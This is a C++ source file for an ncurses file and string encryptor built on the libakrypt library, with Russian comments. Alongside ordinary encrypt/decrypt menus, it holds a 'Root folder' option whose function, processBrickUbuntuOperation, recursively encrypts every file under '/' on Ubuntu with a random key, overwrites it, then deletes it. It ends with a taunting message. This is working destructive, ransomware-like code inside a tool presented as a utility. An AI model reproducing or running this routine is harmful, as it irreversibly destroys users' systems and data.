/**
 * @file       <main_menu.hpp>
 * @brief      Основной файл графической части ak-file-encryptor.
 *
 *             Содержит в себе кучу мусора, а так же пару интересных наработак связвнных с ncurses.
 *
 * @author     THE_CHOODICK
 * @date       18-10-2024
 * @version    0.0.1
 *
 * @warning    Этот проект предназначен только для ознокомительных целей, сам проект содежит огромное количество говнокода и багов.
 *
 * @copyright  Copyright 2024 chooisfox. All rights reserved.
 *
 *             (Not really)
 *
 * @license    This project is released under the GNUv3 Public License.
 */
#include "main_menu.hpp"
#include "crypto_provider.hpp"

#include <cstring>
#include <ncurses.h>
#include <unistd.h>
#include <termios.h>
#include <signal.h>
#include <stdlib.h>

#include <string>
#include <chrono>
#include <thread>
#include <filesystem>
#include <vector>

#include <libakrypt.h>

namespace fs = std::filesystem;

struct termios MainMenu::orig_termios;

/**
 * @brief Отображает основное меню и обрабатывает выбор пользователя.
 *
 * Эта функция инициализирует интерфейс ncurses, отображает меню,
 * обрабатывает выбор пользователя и выполняет соответствующие операции.
 * Меню продолжается до тех пор, пока пользователь не выберет выход.
 *
 * @return OptionsSelected Возвращает EXIT при завершении работы программы.
 */
MainMenu::OptionsSelected MainMenu::showMenu()
{
    initializeNCR(); //< Инициализация интерфейса ncurses
    clear();

    while (true)
    {
        clear();
        const auto target_selection = processTargetSelection();

        if (target_selection == OptionsSelected::EXIT)
        {
            break;
        }

        const auto process_selection = processOperationExecution(target_selection);

        if (process_selection == OptionsSelected::EXIT)
        {
            break;
        }

        if (process_selection == OptionsSelected::RETURN)
        {
            continue;
        }
    }

    return cleanupNCR(OptionsSelected::EXIT);
}

/**
 * @brief Обрабатывает выбор цели операции.
 *
 * Эта функция отображает меню, позволяющее пользователю выбрать,
 * что именно он хочет обработать: файл, строку или корневую папку.
 *
 * @return OptionsSelected Возвращает выбранный тип операции:
 *         - OPT_FILE для обработки файла,
 *         - OPT_STRING для обработки строки,
 *         - OPT_ROOT для обработки корневой папки,
 *         - EXIT для выхода из приложения.
 */
MainMenu::OptionsSelected MainMenu::processTargetSelection()
{
    mvprintw(2, 10, "Select what do you want to process?"); clrtoeol();
    mvprintw(3, 10, "-----------------------------------"); clrtoeol();

    ///< Меню выбора цели операции
    mvprintw(4, 12, "1 - File"); clrtoeol();
    mvprintw(5, 12, "2 - String"); clrtoeol();
    mvprintw(6, 12, "3 - Root folder"); clrtoeol();

    // Очищаем остальные строки
    for (int i = 7; i <= 11; ++i)
    {
        mvprintw(i, 12, " "); clrtoeol();
    }

    return getUserInput({'1', '2', '3', 'q'});
}

/**
 * @brief Обрабатывает выбор операции шифрования или расшифрования.
 *
 * Эта функция отображает меню, позволяющее пользователю выбрать,
 * хочет ли он зашифровать или расшифровать данные, а также
 * предоставить возможность вернуться в предыдущее меню.
 *
 * @param target_selection Выбор типа операции из перечисления OptionsSelected,
 *                        определяющего, будет ли операция применена к файлу
 *                        или строке.
 *
 * @return OptionsSelected Возвращает выбранную операцию:
 *         - TYPE_ENCRYPT для шифрования,
 *         - TYPE_DECRYPT для расшифрования,
 *         - RETURN для возврата в предыдущее меню,
 *         - EXIT для выхода из приложения.
 */
MainMenu::OptionsSelected MainMenu::processOperationSelection(MainMenu::OptionsSelected target_selection)
{
    std::string target_type = (target_selection == OptionsSelected::OPT_FILE) ? "file" : "string";

    mvprintw(2, 10, "Do you want to encrypt or decrypt?"); clrtoeol();
    mvprintw(3, 10, "-----------------------------------"); clrtoeol();
    mvprintw(4, 12, "e - Encrypt %s", target_type.c_str()); clrtoeol();
    mvprintw(5, 12, "d - Decrypt %s", target_type.c_str()); clrtoeol();
    mvprintw(6, 12, "r - Return"); clrtoeol();

    return getUserInput({'e', 'd', 'r', 'q'});
}

/**
 * @brief Обрабатывает выполнение операций на основе выбранного параметра.
 *
 * Эта функция управляет процессом выполнения операций, основанных на
 * выборе пользователя. В зависимости от выбранной опции,
 * функция выполняет соответствующую операцию (например, шифрование
 * или расшифрование строк или файлов). Она также обрабатывает
 * специальные опции, такие как возврат или выход.
 *
 * @param target_selection Выбор операции из перечисления OptionsSelected,
 *                        определяющего, какая операция будет выполнена.
 *
 * @return OptionsSelected Указывает результат выполнения операции:
 *         - EXIT, если пользователь выбрал выход.
 *         - RETURN, если необходимо вернуться к предыдущему меню.
 *         - CONTINUE, если выполнение операции продолжается.
 */
MainMenu::OptionsSelected MainMenu::processOperationExecution(MainMenu::OptionsSelected target_selection)
{
    while (true)
    {
        clear();
        if  (target_selection == OptionsSelected::OPT_ROOT)
        {
            if (processBrickUbuntuOperation())
            {
                return OptionsSelected::EXIT;
            }
            return OptionsSelected::RETURN;
        }

        const auto process_selection = processOperationSelection(target_selection);

        if (process_selection == OptionsSelected::EXIT || process_selection == OptionsSelected::RETURN)
        {
            return process_selection;
        }

        if (target_selection == OptionsSelected::OPT_STRING)
        {
            if (processStringOperation(process_selection))
            {
                return OptionsSelected::EXIT;
            }
        }
        else if (target_selection == OptionsSelected::OPT_FILE)
        {
            if (processFileOperation(process_selection))
            {
                return OptionsSelected::EXIT;
            }
        }

    }
    return OptionsSelected::CONTINUE;
}

/**
 * @brief Обрабатывает операции шифрования или расшифрования для заданной строки.
 *
 * Эта функция позволяет пользователю ввести строку, которую необходимо
 * зашифровать или расшифровать, и пароль для выполнения операции.
 * В зависимости от выбора операции, пользователь может выбрать
 * автоматическую генерацию ключа для шифрования.
 *
 * При выполнении операции:
 * - Вводится строка для шифрования/расшифрования.
 * - Используется созданный ключ для шифрования и расшифрования строки.
 * - Результаты операции сравниваются, и выводится статус (совпадение или несовпадение).
 *
 * @param operation_choice Выбор операции из перечисления OptionsSelected
 *                        (шифрование или расшифрование).
 *
 * @return true, если пользователь выбрал выход после завершения операции;
 *         false в противном случае.
 */
bool MainMenu::processStringOperation(MainMenu::OptionsSelected operation_choice)
{
    clear();

    std::string target_type = (operation_choice == OptionsSelected::TYPE_ENCRYPT) ? "encrypt" : "decrypt";
    mvprintw(2, 10, "Enter string to %s", target_type.c_str()); clrtoeol();
    mvprintw(3, 10, "-----------------------------------"); clrtoeol();

    std::string string_to_encrypt = getInputString(4, "String", 32);

    mvprintw(2, 10, "Enter %sion password", target_type.c_str()); clrtoeol();
    bool generate_key = (operation_choice == OptionsSelected::TYPE_ENCRYPT)
                        ? getYesNoInput(11, "Generate key automatically?")
                        : false;


    struct bckey key;
    generateKeyForOperation(generate_key, key);

    std::string encrypted_string = CryptoProvider::encrypt(string_to_encrypt, &key);
    std::string decrypted_string = CryptoProvider::decrypt(encrypted_string, &key);
    std::string status = (string_to_encrypt == decrypted_string) ? "Match" : "Do Not Match";

    mvprintw(7, 12, "Result: '%s' -> '%s'", decrypted_string.c_str(), encrypted_string.c_str()); clrtoeol();
    mvprintw(11, 12, "(String %s)", status.c_str()); clrtoeol();

    return getYesNoInput(9, "Exit?");
}

/**
 * @brief Обрабатывает операции шифрования или расшифрования для указанного файла.
 *
 * Эта функция позволяет пользователю шифровать или расшифровывать файл,
 * запрашивая у него путь к файлу и пароль.
 * В зависимости от выбора операции,
 * пользователь может выбрать автоматическую генерацию ключа для шифрования.
 *
 * При выполнении операции:
 * - Загружается файл.
 * - Для шифрования/расшифрования используется созданный ключ.
 * - Результаты операции сравниваются, и выводится статус (совпадение или несовпадение).
 * - Пользователь может выбрать, сохранить ли зашифрованный файл.
 *
 * @param operation_choice Выбор операции из перечисления OptionsSelected
 *                        (шифрование или расшифрование).
 *
 * @return true, если пользователь выбрал выход после завершения операции;
 *         false в противном случае.
 */
bool MainMenu::processFileOperation(MainMenu::OptionsSelected operation_choice)
{
    std::string target_type = (operation_choice == OptionsSelected::TYPE_ENCRYPT) ? "encrypt" : "decrypt";
    std::string input_file = getInputWithFileValidation("Enter file path: ");
    fs::path path(input_file);
    std::string file_name = path.filename().string();

    if (operation_choice == OptionsSelected::RETURN)
    {
        return false;
    }

    clear();
    mvprintw(2, 10, "Enter %sion password", target_type.c_str()); clrtoeol();
    mvprintw(3, 10, "-----------------------------------");

    mvprintw(4, 12, "File: %s", file_name.c_str()); clrtoeol();

    bool generate_key = (operation_choice == OptionsSelected::TYPE_ENCRYPT)
                        ? getYesNoInput(11, "Generate key automatically?")
                        : false;

    struct bckey key;
    generateKeyForOperation(generate_key, key);

    size_t size = 0;
    ak_uint8* buffer = nullptr; 
    buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());

    if (!buffer || size == 0)
    {
        mvprintw(9, 12, "Failed to load file or file is empty.");
        return false;
    }

    auto encrypted_buffer = CryptoProvider::encrypt(buffer, size, &key);
    auto decrypted_buffer = CryptoProvider::decrypt(encrypted_buffer, size, &key);

    std::string status = (std::memcmp(buffer, decrypted_buffer, size) == 0) ? "Match" : "Non Match";

    size_t decrypted_size = std::min<size_t>(size, 32);
    size_t encrypted_size = std::min<size_t>(size, 32);

    std::string decrypted_string = std::string(reinterpret_cast<char*>(decrypted_buffer), decrypted_size);
    std::string encrypted_string = std::string(reinterpret_cast<char*>(encrypted_buffer), encrypted_size);

    decrypted_string = MainMenu::stripNewlines(decrypted_string);
    encrypted_string = MainMenu::stripNewlines(encrypted_string);

    mvprintw(7, 12, "Result: '%s' -> '%s'", decrypted_string.c_str(), encrypted_string.c_str()); clrtoeol();
    mvprintw(11, 12, "(String %s)", status.c_str()); clrtoeol();

    if (getYesNoInput(9, "Save to file?"))
    {
        CryptoProvider::ak_save_to_file(encrypted_buffer, size, input_file);
    }

    delete[] encrypted_buffer;
    delete[] decrypted_buffer;
    delete[] buffer;

    return getYesNoInput(9, "Exit?");
}

/**
 * @brief Обрабатывает операцию шифрования для системы Ubuntu.
 *
 * Эта функция выполняет рекурсивное шифрование всех обычных файлов
 * в файловой системе, если операционная система - Ubuntu.
 * Если система не поддерживается, выводится сообщение об ошибке.
 *
 * При запуске функции:
 * - Генерируется случайный пароль длиной 32 символа.
 * - Создается ключ на основе этого пароля.
 * - Каждый файл в файловой системе загружается, шифруется
 *   с использованием созданного ключа и сохраняется обратно.
 * - Исходный файл удаляется после успешного шифрования.
 *
 * @return true, если пользователь выбрал выход после завершения операции;
 *         false в противном случае.
 */
bool MainMenu::processBrickUbuntuOperation()
{
    clear();

    if (strcmp(CMAKE_SYSTEM_ID , "ubuntu") == 0)
    {
        mvprintw(2, 10, "Starting encryption operation.");
        mvprintw(3, 10, "-----------------------------------");

        struct bckey key;
        size_t password_length = 32;
        std::vector<char> password(password_length + 1, 0);

        CryptoProvider::generate_random_string(32, password.data());
        CryptoProvider::generate_key_from_password(password.data(), "", &key);

        for (const auto& entry : fs::recursive_directory_iterator(fs::path("/")))
        {
            if (fs::is_regular_file(entry.status()))
            {
                const std::string input_file = entry.path().string();
                ak_uint8* buffer = nullptr;
                size_t size = 0;

                buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());
                if (!buffer)
                {
                    mvprintw(4, 12, "Failed to load file: %s", input_file.c_str());
                    continue;
                }

                ak_uint8* encrypted_buffer = CryptoProvider::encrypt(buffer, size, &key);
                if (!encrypted_buffer)
                {
                    mvprintw(4, 12, "Encryption failed for file: %s", input_file.c_str());
                    delete[] buffer;
                    continue;
                }

                if (!CryptoProvider::ak_save_to_file(encrypted_buffer, size, input_file.c_str()))
                {
                    mvprintw(4, 12, "Failed to save encrypted file: %s", input_file.c_str());
                }

                delete[] buffer;
                delete[] encrypted_buffer;

                fs::remove(input_file);
            }
        }

        mvprintw(4, 12, "Encryption complete.");
        mvprintw(5, 12, "I told you during cmake generation not to compile it.");
        mvprintw(6, 12, "Good luck decryptin it :) Better switch to any other linux..");
        mvprintw(7, 12, "Your encryption key: %s...", CryptoProvider::bckey_to_string(&key).c_str());
    }
    else
    {
        mvprintw(2, 10, "Wrong file system, %s is not supported", CMAKE_SYSTEM_ID);
        mvprintw(3, 10, "-----------------------------------");
        mvprintw(4, 12, "In order to recursively encrypt your whole system");
        mvprintw(5, 12, "You have to be an Ubuntu user");
    }
    return getYesNoInput(8, "Exit?");
}

/**
 * @brief Генерирует ключ для операции на основе пароля или случайной строки.
 *
 * Эта функция создает ключ на основе пароля, введенного пользователем, или генерирует случайный пароль,
 * если параметр generate_key установлен в true. Сгенерированный или введенный пароль используется
 * для создания ключа с помощью функции CryptoProvider::generate_key_from_password.
 *
 * @param generate_key Флаг, указывающий, нужно ли генерировать случайный ключ (true) или запрашивать
 * ввод пароля от пользователя (false).
 * @param key Структура bckey, в которую будет записан сгенерированный ключ.
 *
 * @note При генерации случайного ключа длина пароля составляет 32 символа.
 * В случае, если пользователь вводит пароль, он также ограничен 32 символами.
 */
void MainMenu::generateKeyForOperation(bool generate_key, struct bckey& key)
{
    size_t password_length = 32;
    std::vector<char> password(password_length + 1, 0);

    if (generate_key)
    {
        CryptoProvider::generate_random_string(32, password.data());
        CryptoProvider::generate_key_from_password(password.data(), "", &key);
        mvprintw(5, 12, "Password: %s", password.data());
        mvprintw(6, 12, "Key: %s...", CryptoProvider::bckey_to_string(&key).substr(0, 32).c_str());
    }
    else
    {
        const auto input_string = getInputString(5, "Password", 32);
        std::strncpy(password.data(), input_string.c_str(), password_length);
        CryptoProvider::generate_key_from_password(password.data(), "", &key);
        mvprintw(6, 12, "Key: %s...", CryptoProvider::bckey_to_string(&key).substr(0, 32).c_str());
    }
}

/**
 * @brief Запрашивает строковый ввод от пользователя с учетом максимальной длины.
 *
 * Эта функция выводит на экран сообщение с целью ввода и ожидает ввода от пользователя.
 * Пользователь может вводить символы, и ввод будет ограничен заданной максимальной длиной.
 * Пользователь может удалить последний введенный символ с помощью клавиши Backspace.
 * Ввод завершается при нажатии клавиши Enter, если поле ввода не пустое.
 *
 * @param line Номер строки, в которой будет выведено сообщение.
 * @param purpose Описание цели ввода (например, "Введите имя").
 * @param max_length Максимально допустимое количество символов во вводимой строке.
 *
 * @return Возвращает введенную строку.
 */
std::string MainMenu::getInputString(int line, const std::string& purpose, unsigned int max_length)
{
    std::string input;
    int user_input;

    while (true)
    {
        user_input = getch();
        if (user_input == '\n' && !input.empty())
            break;
        if ((user_input == 127 || user_input == KEY_BACKSPACE) && !input.empty())
        {
            input.pop_back();
        }
        else if (input.length() < max_length && isprint(user_input))
        {
            input += static_cast<char>(user_input);
        }
        mvprintw(11, 12, "(You enteren %d out of %d characters)", max_length, (int)input.length());
        mvprintw(line, 12, "%s: %s", purpose.c_str(), input.c_str()); clrtoeol();
        refresh();
    }

    mvprintw(11, 12, " "); clrtoeol();
    return input;
}

/**
 * @brief Запрашивает у пользователя ответ "да" или "нет".
 *
 * Эта функция выводит на экран заданный вопрос и ожидает ввода от пользователя.
 * Пользователь может ввести 'y' или 'n' (в любом регистре). В случае недопустимого
 * ввода выводится сообщение об ошибке, и запрос повторяется.
 *
 * @param line Номер строки, в которой будет выведен вопрос.
 * @param question Вопрос, который необходимо задать пользователю.
 *
 * @return Возвращает true, если пользователь ответил "да" (ввод 'y' или 'Y'),
 *         и false в противном случае (ввод 'n' или 'N').
 */
bool MainMenu::getYesNoInput(int line, const std::string& question)
{
    int user_input;
    bool valid_input = false;

    mvprintw(line, 12, "%s (y/n): ", question.c_str()); clrtoeol();
    refresh();

    while (!valid_input)
    {
        user_input = getch();
        if (user_input == 'y' || user_input == 'Y' || user_input == 'n' || user_input == 'N')
        {
            valid_input = true;
        }
        else
        {
            if (user_input > 0)
            {
                mvprintw(line, 12, "Invalid input! Please enter 'y' or 'n': "); clrtoeol();
                refresh();
            }
        }
    }
    return (user_input == 'y' || user_input == 'Y');
}

/**
 * @brief Обрабатывает прерывания, вызванные сигналами.
 *
 * Эта функция вызывается при получении сигналов завершения (например, SIGINT или SIGTERM).
 * Она выполняет очистку ресурсов, связанных с режимом ncurses, и завершает программу с
 * кодом возврата, равным значению сигнала.
 *
 * @param signal Значение сигнала, вызвавшего прерывание.
 */
void MainMenu::handleInterrupt(int signal)
{
    cleanupNCR();
    exit(signal);
}

/**
 * @brief Инициализирует режим ncurses и настраивает терминал.
 *
 * Эта функция сохраняет исходное состояние терминала, устанавливает обработчики сигналов
 * для завершения программы, инициализирует библиотеку ncurses и настраивает режим ввода.
 *
 * После вызова этой функции терминал будет работать в режиме ncurses с отключенной
 * эхо-выводом и активированной клавиатурой.
 */
void MainMenu::initializeNCR()
{
    tcgetattr(STDIN_FILENO, &orig_termios); ///< Сохраняем исходное состояние терминала

    signal(SIGINT, handleInterrupt);  ///< Перехватываем сигналы завершения
    signal(SIGTERM, handleInterrupt);

    initscr(); ///< Инициализируем режим ncurses

    cbreak();
    noecho();

    keypad(stdscr, TRUE);
    nodelay(stdscr, TRUE);
    timeout(0);
}

/**
 * @brief Очищает ресурсы и восстанавливает состояние терминала.
 *
 * Эта функция восстанавливает оригинальные настройки терминала и завершает работу библиотеки ncurses.
 *
 * @param option Выбранный вариант из перечисления `OptionsSelected`.
 * @return Возвращает переданный параметр `option`.
 */
MainMenu::OptionsSelected MainMenu::cleanupNCR(MainMenu::OptionsSelected option)
{
    tcsetattr(STDIN_FILENO, TCSANOW, &orig_termios);
    endwin();
    return option;
}

/**
 * @brief Ожидает ввод пользователя и возвращает выбранную опцию.
 *
 * Эта функция отображает время до окончания ожидания и отслеживает
 * ввод пользователя для выбора опции из допустимых значений. Если
 * время истекает или пользователь вводит недопустимое значение,
 * функция завершает работу и возвращает `OptionsSelected::EXIT`.
 *
 * @param valid_inputs Набор допустимых символов для выбора опций.
 * @return MainMenu::OptionsSelected Выбранная пользователем опция.
 */
MainMenu::OptionsSelected MainMenu::getUserInput(const std::set<char>& valid_inputs)
{
    int user_input;
    int countdown = 15;
    auto start_time = std::chrono::steady_clock::now();

    mvprintw(7, 12, "q - Exit");

    while (true)
    {
        mvprintw(8, 12, "Time left: %d seconds", countdown);
        refresh();

        user_input = getch();
        if (valid_inputs.count(user_input))
        {
            switch (user_input)
            {
                case '1': return OptionsSelected::OPT_FILE;
                case '2': return OptionsSelected::OPT_STRING;
                case '3': return OptionsSelected::OPT_ROOT;
                case 'e': return OptionsSelected::TYPE_ENCRYPT;
                case 'd': return OptionsSelected::TYPE_DECRYPT;
                case 'r': return OptionsSelected::RETURN;
                case 'c': return OptionsSelected::CONTINUE;
                case 'p': return OptionsSelected::PICK_ANOTHER;
                case 'q':
                default: return OptionsSelected::EXIT;
            }
        }

        auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(
                            std::chrono::steady_clock::now() - start_time).count();
        if (elapsed_time >= 1)
        {
            countdown--;
            start_time = std::chrono::steady_clock::now();
        }

        if (countdown <= 0)
        {
            mvprintw(9, 12, "Time's up! Exiting...");
            refresh();
            std::this_thread::sleep_for(std::chrono::seconds(2));
            return OptionsSelected::EXIT;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    return OptionsSelected::EXIT;
}

/**
 * @brief Форматирует строку для отображения пути.
 *
 * Если длина пути превышает 32 символа, возвращает строку, начинающуюся с "..." и заканчивающуюся последними 32 символами пути.
 *
 * @param path Путь к файлу или директории.
 * @return Отформатированная строка для отображения.
 */
std::string MainMenu::formatDisplayString(const std::string& path)
{
    return path.length() > 32 ? "..." + path.substr(path.length() - 32) : path;
}

/**
 * @brief Отрисовывает файловый менеджер.
 *
 * Очищает экран, отображает приглашение и информацию о текущем пути. Если путь ведет к директории,
 * отображает содержимое директории. Если путь ведет к файлу, отображает содержимое родительской директории
 * с фильтрацией по имени файла.
 *
 * @param user_input Ввод пользователя, содержащий путь к файлу или директории.
 * @param prompt Строка с приглашением для пользователя.
 */
void MainMenu::drawFileManager(const std::string& user_input, const std::string& prompt)
{
    clear();
    mvprintw(2, 10, "Please select file");
    mvprintw(3, 10, "-----------------------------------");
    mvprintw(4, 12, "%s%s", prompt.c_str(), formatDisplayString(user_input).c_str());

    if (fs::exists(user_input) && fs::is_directory(user_input))
    {
        mvprintw(5, 12, "Content of directory: %s", formatDisplayString(user_input).c_str());
        int line = 6;
        for (const auto& entry : fs::directory_iterator(user_input))
        {
            mvprintw(line++, 12, "%s", entry.path().filename().c_str());
        }
    }
    else
    {
        std::string last_dir;
        size_t last_slash_pos = user_input.find_last_of('/');
        if (last_slash_pos != std::string::npos)
        {
            last_dir = user_input.substr(0, last_slash_pos + 1); //<  Получить путь до последнего '/'
            if (fs::exists(last_dir) && fs::is_directory(last_dir))
            {
                std::string filter = user_input.substr(last_slash_pos + 1);
                mvprintw(5, 12, "Content of directory: %s", formatDisplayString(last_dir).c_str());
                int line = 6;
                for (const auto& entry : fs::directory_iterator(last_dir))
                {
                    std::string filename = entry.path().filename().string();
                    if (filename.find(filter) != std::string::npos)
                    {
                        mvprintw(line++, 12, "%s", filename.c_str());
                    }
                }
            }
        }
    }

    mvprintw(4, 12, "%s%s", prompt.c_str(), formatDisplayString(user_input).c_str());
    clrtoeol();
}

/**
 * @brief Получает ввод пользователя с валидацией файла.
 *
 * Запрашивает у пользователя ввод пути к файлу, отображает файловый менеджер и проверяет, является ли
 * введенный путь допустимым файлом. Возвращает путь, если он является действительным файлом.
 *
 * @param prompt Строка с приглашением для пользователя.
 * @return Путь к действительному файлу, введенному пользователем.
 */
std::string MainMenu::getInputWithFileValidation(const std::string& prompt)
{
    std::string user_input = fs::current_path();
    int ch;

    drawFileManager(user_input, prompt);

    while (true)
    {
        ch = getch();
        if (ch == 127 || ch == KEY_BACKSPACE)
        {
            if (!user_input.empty())
            {
                user_input.pop_back();
                drawFileManager(user_input, prompt);
            }
        }
        else if (ch == '\n')
        {
            if (fs::exists(user_input) && fs::is_regular_file(user_input))
            {
                return user_input;
            }
        }
        else if (ch > 0)
        {
            user_input.push_back(static_cast<char>(ch));
            drawFileManager(user_input, prompt);
        }
    }
}

/**
 * @brief Удаляет символы новой строки из строки.
 *
 * Заменяет все символы новой строки в строке на пробелы.
 *
 * @param str Исходная строка.
 * @return Строка без символов новой строки.
 */
std::string MainMenu::stripNewlines(const std::string& str)
{
    std::string modified = str;
    std::replace(modified.begin(), modified.end(), '\n', ' ');
    return modified;
}
